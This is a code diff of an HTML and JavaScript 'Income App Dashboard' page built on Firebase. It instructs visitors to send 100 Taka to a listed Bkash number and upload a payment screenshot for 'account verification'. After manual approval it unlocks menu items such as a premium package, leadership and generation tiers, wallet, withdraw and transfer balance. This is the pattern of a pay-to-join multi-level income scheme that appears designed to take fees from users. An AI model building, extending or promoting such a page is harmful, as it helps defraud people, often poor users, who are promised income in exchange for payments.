@@ -1,46 +1,105 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Income App</title>
+<title>Income App Dashboard</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
-body {font-family: Arial; text-align: center; background:#0f172a; color:white;}
-.box {margin-top:60px;}
-button {
-padding:15px;
-margin:10px;
-width:80%;
-border:none;
-border-radius:10px;
-font-size:18px;
-background:#22c55e;
-color:white;
-}
+body {font-family: Arial; background:#0f172a; color:white; text-align:center;}
+button {padding:15px; margin:10px; width:80%; border:none; border-radius:10px; font-size:18px; background:#22c55e; color:white;}
+input {margin:10px; padding:10px; width:80%;}
+.menu-section {margin-top:30px; border-top:1px solid #555; padding-top:20px;}
+.disabled {opacity:0.5; pointer-events:none;}
 </style>
 </head>
 <body>
 
-<div class="box">
-<h2>💰 My Income App</h2>
-</button>
+<h2>💰 Income App Dashboard</h2>
 
-<button onclick="alert('Bkash: 01821192590')"
-✅ Account Verify - 100 Taka
-</button>
-
-<button onclick="alert('Premium Package: 300 Taka')">
-💎 Premium Package
-</button>
-
-<button onclick="alert('Coming Soon')">
-👥 Referral System
-</button>
-
-<button onclick="alert('Admin Telegram: @yourusername')">
-📞 Support
-</button>
-
+<!-- Account Verify -->
+<div id="account-verify">
+<h3>✅ Account Verify - 100 Tk</h3>
+<p>Send 100 Tk to Bkash: 01821192590, then upload screenshot:</p>
+<input type="file" id="screenshotInput" accept="image/*">
+<button onclick="uploadScreenshot()">Submit Screenshot</button>
+<p id="status"></p>
 </div>
 
+<!-- Menu -->
+<div id="menu">
+<div class="menu-section">
+<button id="dashboardBtn" class="disabled">📊 Dashboard</button>
+<button id="profileBtn" class="disabled">👤 Profile</button>
+<button id="jobsBtn" class="disabled">📋 My Jobs & Proved</button>
+<button id="premiumBtn" class="disabled">💎 Premium Package</button>
+<button id="leadershipBtn" class="disabled">🧑‍💼 Leadership</button>
+<button id="generationBtn" class="disabled">🌳 Generation</button>
+<button id="walletBtn" class="disabled">💰 My Wallet</button>
+<button id="withdrawBtn" class="disabled">🏧 Withdraw</button>
+<button id="transferBtn" class="disabled">🔁 Transfer Balance</button>
+<button id="charityBtn" class="disabled">❤️ Help the Poor</button>
+<button id="supportBtn">📞 Support</button>
+</div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+
+<script>
+// 🔹 Firebase Config
+const firebaseConfig = {
+  apiKey: "YOUR_API_KEY",
+  authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+  projectId: "YOUR_PROJECT_ID",
+  storageBucket: "YOUR_PROJECT_ID.appspot.com",
+  messagingSenderId: "SENDER_ID",
+  appId: "APP_ID"
+};
+
+firebase.initializeApp(firebaseConfig);
+const storage = firebase.storage();
+const db = firebase.firestore();
+
+// 🔹 Telegram Username Input
+let telegramUsername = prompt("Enter your Telegram username (e.g., @username)");
+
+// 🔹 Check Account Status
+db.collection('users').doc(telegramUsername).get().then(doc => {
+  if(doc.exists && doc.data().accountStatus === "approved"){
+    enableMenu();
+  }
+});
+
+// 🔹 Enable Menu Function
+function enableMenu(){
+  const buttons = document.querySelectorAll("#menu button");
+  buttons.forEach(btn => btn.classList.remove("disabled"));
+  document.getElementById("account-verify").style.display = "none";
+}
+
+// 🔹 Upload Screenshot Function
+function uploadScreenshot(){
+  const file = document.getElementById('screenshotInput').files[0];
+  if(!file){ alert('Please select screenshot'); return; }
+
+  const uploadTask = storage.ref('payments/' + telegramUsername + '_' + file.name).put(file);
+
+  uploadTask.on('state_changed', 
+    snapshot => {},
+    error => { console.error(error); },
+    () => {
+      uploadTask.snapshot.ref.getDownloadURL().then(url => {
+        db.collection('users').doc(telegramUsername).set({
+          screenshotURL: url,
+          accountStatus: "pending",
+          timestamp: firebase.firestore.FieldValue.serverTimestamp()
+        }).then(() => {
+          document.getElementById('status').innerText = 'Screenshot uploaded! Waiting for approval.';
+        });
+      });
+    }
+  );
+}
+</script>
 </body>
 </html>
